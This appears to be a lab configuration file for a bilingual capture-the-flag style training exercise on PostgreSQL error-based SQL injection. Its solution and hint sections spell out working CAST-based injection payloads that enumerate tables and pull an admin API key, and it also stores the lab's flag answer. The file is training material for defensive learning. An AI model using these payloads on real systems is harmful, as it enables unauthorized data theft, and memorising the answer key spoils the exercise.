import type { LabMetadata } from '../../../types/lab-metadata.type';

export const lab4Metadata: LabMetadata = {
  slug: 'sqli-error-based',
  title: 'SQL Injection: Error-Based Extraction',
  ar_title: 'حقن SQL: الاستخراج القائم على الأخطاء',
  description:
    'Force the database to reveal data through verbose error messages. Extract table names, columns, and values without UNION or blind techniques.',
  ar_description:
    'أجبر قاعدة البيانات على الكشف عن البيانات من خلال رسائل الأخطاء المفصّلة. استخرج أسماء الجداول والأعمدة والقيم دون UNION أو تقنيات الأعمى.',
  difficulty: 'INTERMEDIATE',
  category: 'WEB_SECURITY',
  skills: ['SQL Injection', 'Error-Based Extraction', 'PostgreSQL Casting', 'Database Enumeration'],
  xpReward: 180,
  pointsReward: 90,
  duration: 40,
  executionMode: 'SHARED_BACKEND',
  isPublished: true,
  environmentType: 'PORTAL_AUTH',
  canonicalConceptId: 'sqli-error',

  goal: 'Use PostgreSQL CAST error-based injection to extract the admin API key from the database.',
  ar_goal: 'استخدم حقن PostgreSQL القائم على خطأ CAST لاستخراج مفتاح API للأدمن من قاعدة البيانات.',

  missionBrief: {
    codename: 'ERROR LEAK',
    classification: 'SECRET',
    objective: 'A user profile portal reflects verbose PostgreSQL errors when queries fail. Use CAST() type mismatch errors to extract the admin API key embedded in the database.',
    ar_objective: 'بوابة ملفات المستخدمين تعكس أخطاء PostgreSQL مفصّلة عند فشل الاستعلامات. استخدم أخطاء عدم التوافق في CAST() لاستخراج مفتاح API للأدمن المضمّن في قاعدة البيانات.',
    background: 'Error-based injection is powerful when apps display raw DB errors. PostgreSQL CAST errors include the value being converted, which leaks data directly.',
    successCriteria: [
      'Trigger a PostgreSQL CAST error to confirm error-based injection',
      'Enumerate table names using information_schema',
      'Extract the api_key column from the admin_keys table',
      'Submit the flag',
    ],
  },

  labInfo: {
    vulnType: 'Error-Based SQL Injection',
    ar_vulnType: 'حقن SQL القائم على الأخطاء',
    cweId: 'CWE-89',
    cvssScore: 8.8,
    description: 'When error messages contain query data, CAST() tricks force the DB to try converting a string result to integer — failing with the value in the error message.',
    ar_description: 'عندما تحتوي رسائل الأخطاء على بيانات الاستعلام، تجبر حيل CAST() قاعدة البيانات على محاولة تحويل نتيجة نصية إلى عدد صحيح — مما يفشل مع القيمة في رسالة الخطأ.',
    whatYouLearn: [
      'How CAST() errors leak data in PostgreSQL',
      'How to enumerate tables via information_schema',
      'How to extract arbitrary column values through error messages',
    ],
    techStack: ['Node.js', 'PostgreSQL', 'Raw SQL'],
  },

  briefing: {
    en: `A developer portal lets admins look up users by ID.\nYou found it shows raw PostgreSQL error messages when queries fail.\n"invalid input syntax for type integer: \"admin_key_here\""\nThat error message just became your exfiltration channel.`,
    ar: `بوابة المطورين تتيح للأدمن البحث عن المستخدمين بالمعرّف.\nوجدت أنها تُظهر رسائل خطأ PostgreSQL الخام عند فشل الاستعلامات.\n"invalid input syntax for type integer: \"admin_key_here\""\nرسالة الخطأ هذه أصبحت قناة تسريب بياناتك.`,
  },

  stepsOverview: {
    en: [
      'Trigger — inject CAST to force a type error and confirm data leaks',
      'Enumerate — extract table names from information_schema',
      'Extract — pull the api_key from admin_keys table via CAST error',
    ],
    ar: [
      'تشغيل — احقن CAST لإجبار خطأ النوع وتأكيد تسريب البيانات',
      'تعداد — استخرج أسماء الجداول من information_schema',
      'استخراج — اسحب api_key من جدول admin_keys عبر خطأ CAST',
    ],
  },

  solution: {
    context: 'User lookup: SELECT * FROM users WHERE id = $input (no parameterization)',
    vulnerableCode: "SELECT * FROM users WHERE id = '$input'",
    exploitation: "Step 1: CAST((SELECT 'test') AS integer) → error with 'test'. Step 2: CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS integer) → leaks table name. Step 3: CAST((SELECT api_key FROM admin_keys LIMIT 1) AS integer) → leaks api_key.",
    steps: {
      en: [
        "id=1 AND 1=CAST((SELECT 'data_test') AS integer)-- → error reveals 'data_test'",
        "id=1 AND 1=CAST((SELECT table_name FROM information_schema.tables WHERE table_schema='public' LIMIT 1) AS integer)-- → leaks table name",
        "id=1 AND 1=CAST((SELECT api_key FROM admin_keys LIMIT 1) AS integer)-- → leaks API key = flag",
      ],
      ar: [
        "id=1 AND 1=CAST((SELECT 'data_test') AS integer)-- → الخطأ يكشف 'data_test'",
        "id=1 AND 1=CAST((SELECT table_name FROM information_schema.tables WHERE table_schema='public' LIMIT 1) AS integer)-- → يكشف اسم الجدول",
        "id=1 AND 1=CAST((SELECT api_key FROM admin_keys LIMIT 1) AS integer)-- → يكشف مفتاح API = العلم",
      ],
    },
    fix: [
      'Never expose raw DB error messages to users',
      'Use generic error pages',
      'Use parameterized queries',
      'Cast input to integer before use: parseInt(id)',
    ],
  },

  postSolve: {
    explanation: {
      en: 'PostgreSQL CAST errors include the value that failed conversion. By wrapping a subquery in CAST(... AS integer), the subquery result appears verbatim in the error message.',
      ar: 'أخطاء PostgreSQL CAST تتضمن القيمة التي فشل تحويلها. بتغليف استعلام فرعي في CAST(... AS integer)، تظهر نتيجة الاستعلام الفرعي كاملة في رسالة الخطأ.',
    },
    impact: {
      en: 'Complete data extraction through error messages. No blind inference needed — every query result is delivered directly in the HTTP response.',
      ar: 'استخراج كامل للبيانات من خلال رسائل الأخطاء. لا حاجة للاستنتاج الأعمى — كل نتيجة استعلام تُسلَّم مباشرة في استجابة HTTP.',
    },
    fix: ['Generic error pages', 'Parameterized queries', 'Input validation'],
  },

  hints: [
    {
      order: 1,
      xpCost: 15,
      content: "Test error-based injection by triggering a CAST type mismatch:\n  /user?id=1 AND 1=CAST((SELECT 'hello') AS integer)--\nIf the error shows 'hello', the app leaks query results through errors.",
    },
    {
      order: 2,
      xpCost: 25,
      content: "Enumerate tables using information_schema:\n  /user?id=1 AND 1=CAST((SELECT table_name FROM information_schema.tables WHERE table_schema='public' ORDER BY table_name LIMIT 1) AS integer)--\nNote the table names that appear in the error.",
    },
    {
      order: 3,
      xpCost: 40,
      content: "Extract the API key from admin_keys table:\n  /user?id=1 AND 1=CAST((SELECT api_key FROM admin_keys LIMIT 1) AS integer)--\nThe full API key (= your flag) will appear in the error message.",
    },
  ],

  flagAnswer: 'FLAG{SQLI_ERROR_BASED_SUCCESS}',
  initialState: {
    admin_keys: [{ id: 1, api_key: 'FLAG{SQLI_ERROR_BASED_SUCCESS}' }],
  },
};
